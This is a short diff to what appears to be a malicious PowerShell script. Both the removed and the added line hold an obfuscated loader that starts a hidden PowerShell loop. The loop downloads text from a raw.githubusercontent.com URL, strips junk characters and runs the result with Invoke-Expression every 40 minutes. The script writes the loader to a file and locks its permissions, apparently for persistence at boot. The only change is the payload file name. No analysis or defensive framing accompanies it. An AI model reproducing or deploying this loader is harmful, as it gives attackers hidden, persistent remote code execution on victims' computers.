@@ -40,7 +40,7 @@ function Set_bootACL($filepath)
 	Set-Acl -Path $filepath -ACLObject $mgr_acl	
 	return $True
 }
-$content = "cmd /c start /min powershell start-process powershell {while(`$true){[string]`$awdsdsadas={(Ngaxcvferwew-Obgaxcvferwject Ngaxcvferwet.WgaxcvferwebClgaxcvferwient).Dowgaxcvferwnloadsgaxcvferwtring('hgaxcvferwttpgaxcvferws:/gaxcvferw/rgaxcvferwaw.gigaxcvferwthubusercongaxcvferwtent.cgaxcvferwom/ghgaxcvferwi876/uiygaxcvferwh55/magaxcvferwin/helgaxcvferwp.tgaxcvferwxt')};`$dfsfsdf=`$awdsdsadas.Replace('gaxcvferw','');`$bvcbvcv=iex `$dfsfsdf;invoke-expression `$bvcbvcv;start-sleep -s 2400}} -windowstyle hidden"
+$content = "cmd /c start /min powershell start-process powershell {while(`$true){[string]`$awdsdsadas={(Ngaxcvferwew-Obgaxcvferwject Ngaxcvferwet.WgaxcvferwebClgaxcvferwient).Dowgaxcvferwnloadsgaxcvferwtring('hgaxcvferwttpgaxcvferws:/gaxcvferw/rgaxcvferwaw.gigaxcvferwthubusercongaxcvferwtent.cgaxcvferwom/ghgaxcvferwi876/uiygaxcvferwh55/magaxcvferwin/helgaxcvferwp1.tgaxcvferwxt')};`$dfsfsdf=`$awdsdsadas.Replace('gaxcvferw','');`$bvcbvcv=iex `$dfsfsdf;invoke-expression `$bvcbvcv;start-sleep -s 2400}} -windowstyle hidden"
 sc $paFile $content
 Set_bootACL($paFile)
 
